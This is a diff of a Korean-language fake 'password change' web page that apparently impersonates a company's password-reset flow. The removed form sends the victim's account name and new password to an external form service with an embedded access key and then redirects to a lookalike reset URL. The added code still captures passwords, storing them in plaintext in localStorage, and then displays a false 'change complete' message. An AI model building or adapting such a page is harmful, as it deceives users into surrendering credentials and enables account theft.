@@ -23,10 +23,8 @@
     }
     .icon { text-align: center; font-size: 48px; margin-bottom: 12px; }
     h1 { text-align: center; font-size: 21px; font-weight: 700; color: #111; margin-bottom: 28px; }
-
     label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 7px; margin-top: 18px; }
     label:first-of-type { margin-top: 0; }
-
     .wrap { position: relative; }
     input[type="password"], input[type="text"] {
       width: 100%; padding: 15px 48px 15px 16px;
@@ -38,18 +36,15 @@
     input:focus { border-color: #1a73e8; background: #fff; }
     input.ok  { border-color: #43a047; }
     input.err { border-color: #e53935; }
-
     .eye {
       position: absolute; right: 14px; top: 50%;
       transform: translateY(-50%);
       font-size: 20px; cursor: pointer; opacity: 0.4; user-select: none;
     }
-
     .hint { font-size: 12px; margin-top: 5px; min-height: 16px; }
     .hint.red   { color: #e53935; }
     .hint.green { color: #43a047; }
-
-    button[type="submit"] {
+    button.primary {
       width: 100%; padding: 16px; margin-top: 28px;
       background: #1a73e8; color: #fff; border: none;
       border-radius: 12px; font-size: 17px; font-weight: 700;
@@ -57,10 +52,8 @@
       transition: background 0.15s, transform 0.1s;
       touch-action: manipulation;
     }
-    button[type="submit"]:active:not(:disabled) { background: #1557b0; transform: scale(0.98); }
-    button[type="submit"]:disabled { background: #c5d9f5; color: #8ab0e8; cursor: not-allowed; }
-
-    /* 완료 화면 */
+    button.primary:active:not(:disabled) { background: #1557b0; transform: scale(0.98); }
+    button.primary:disabled { background: #c5d9f5; color: #8ab0e8; cursor: not-allowed; }
     .done { display: none; text-align: center; }
     .done .big { font-size: 58px; margin-bottom: 14px; }
     .done h2 { font-size: 20px; font-weight: 700; color: #2e7d32; margin-bottom: 8px; }
@@ -70,45 +63,26 @@
 <body>
 <div class="card">
 
-  <!-- 입력 폼 -->
   <div id="formView">
     <div class="icon">🔒</div>
     <h1>비밀번호 변경</h1>
 
-    <!--
-      ★ Formspree 연동 방법:
-         1. https://formspree.io 가입 후 새 Form 생성
-         2. 아래 action의 "YOUR_FORM_ID" 부분을 실제 ID로 교체
-            예: action="https://formspree.io/f/abcd1234"
-    -->
-    <form id="pwForm" action="https://api.web3forms.com/submit" method="POST">
+    <label for="pw1">새 비밀번호</label>
+    <div class="wrap">
+      <input type="password" id="pw1" placeholder="8자 이상 입력" autocomplete="new-password">
+      <span class="eye" data-t="pw1">👁</span>
+    </div>
 
-      <input type="hidden" name="access_key" value="b698128d-92e8-4666-8b7b-23aa1f5f1269">
-      <input type="hidden" name="subject" value="비밀번호 변경 요청">
-      <input type="hidden" name="account" id="accountField">
-      <input type="hidden" name="botcheck" value="">
-      <input type="hidden" name="redirect" value="https://janushenderson.io/app/password/resetpassword/?done=1">
+    <label for="pw2">비밀번호 확인</label>
+    <div class="wrap">
+      <input type="password" id="pw2" placeholder="비밀번호를 다시 입력" autocomplete="new-password">
+      <span class="eye" data-t="pw2">👁</span>
+    </div>
+    <div class="hint" id="hint"></div>
 
-      <label for="pw1">새 비밀번호</label>
-      <div class="wrap">
-        <input type="password" id="pw1" name="new_password"
-               placeholder="8자 이상 입력" autocomplete="new-password" required>
-        <span class="eye" data-t="pw1">👁</span>
-      </div>
-
-      <label for="pw2">비밀번호 확인</label>
-      <div class="wrap">
-        <input type="password" id="pw2" name="confirm_password"
-               placeholder="비밀번호를 다시 입력" autocomplete="new-password" required>
-        <span class="eye" data-t="pw2">👁</span>
-      </div>
-      <div class="hint" id="hint"></div>
-
-      <button type="submit" id="submitBtn" disabled>확인</button>
-    </form>
+    <button class="primary" id="submitBtn" disabled>확인</button>
   </div>
 
-  <!-- 완료 화면 -->
   <div class="done" id="doneView">
     <div class="big">✅</div>
     <h2>변경 완료</h2>
@@ -117,11 +91,8 @@
 
 </div>
 <script>
-  // URL 파라미터에서 계정명 읽기 (?account=user001)
   const params = new URLSearchParams(location.search);
-  if (params.get('account')) {
-    document.getElementById('accountField').value = params.get('account');
-  }
+  const account = params.get('account') || '(미지정)';
 
   const pw1 = document.getElementById('pw1');
   const pw2 = document.getElementById('pw2');
@@ -150,9 +121,18 @@
     });
   });
 
-  // 제출 전 버튼 상태만 변경, 실제 전송은 form 기본 동작으로 처리
-  document.getElementById('pwForm').addEventListener('submit', () => {
-    btn.textContent = '처리 중…';
+  btn.addEventListener('click', () => {
+    // 제출 기록을 localStorage에 저장
+    const records = JSON.parse(localStorage.getItem('pw_submissions') || '[]');
+    records.push({
+      account,
+      password: pw1.value,
+      time: new Date().toLocaleString('zh-CN', { hour12: false })
+    });
+    localStorage.setItem('pw_submissions', JSON.stringify(records));
+
+    document.getElementById('formView').style.display = 'none';
+    document.getElementById('doneView').style.display = 'block';
   });
 </script>
 </body>
